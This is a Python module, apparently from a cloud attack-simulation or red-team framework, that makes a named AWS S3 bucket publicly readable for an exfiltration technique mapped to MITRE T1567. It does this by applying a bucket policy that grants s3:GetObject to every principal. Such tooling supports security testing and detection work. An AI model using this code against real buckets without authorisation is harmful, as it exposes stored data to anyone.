from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
import boto3
import json

@TechniqueRegistry.register
class AWSExposeS3BucketPublic(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1567",
                technique_name="Exfiltration Over Web Service",
                tactics=["Exfiltration"],
                sub_technique_name=None
            )
        ]
        super().__init__("Expose S3 Bucket Public", "This module attempts to enable public read access to the bucket by creating a bucket policy and applying it to the target bucket.", mitre_techniques)
        
    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        
        try:
            bucket_name:str = kwargs.get("bucket_name", None)

            # Input validation
            if bucket_name in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": {"input_required":"Target Bucket Name"}
                }

            # Initialize boto3 client
            my_client = boto3.client('s3')

            # Bucket policy config to allow public read access
            bucket_policy = {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Sid": "HalberdS3PublicReadObject",
                        "Effect": "Allow",
                        "Principal": "*",
                        "Action": "s3:GetObject",
                        "Resource": f"arn:aws:s3:::{bucket_name}/*"
                    }
                ]
            }

            # Convert policy to JSON
            policy_string = json.dumps(bucket_policy)

            # Set new bucket policy
            raw_response = my_client.put_bucket_policy(Bucket=bucket_name, Policy=policy_string)
            print(raw_response)
                        
            return ExecutionStatus.SUCCESS, {
                "message": f"Successfully exposed S3 bucket {bucket_name} public",
                "value": {
                    "bucket_name" : bucket_name,
                    "public_access": "enabled" 
                }
            }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to expose S3 bucket to public"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "bucket_name": {"type": "str", "required": True, "default": None, "name": "Target Bucket Name", "input_field_type" : "text"},
        }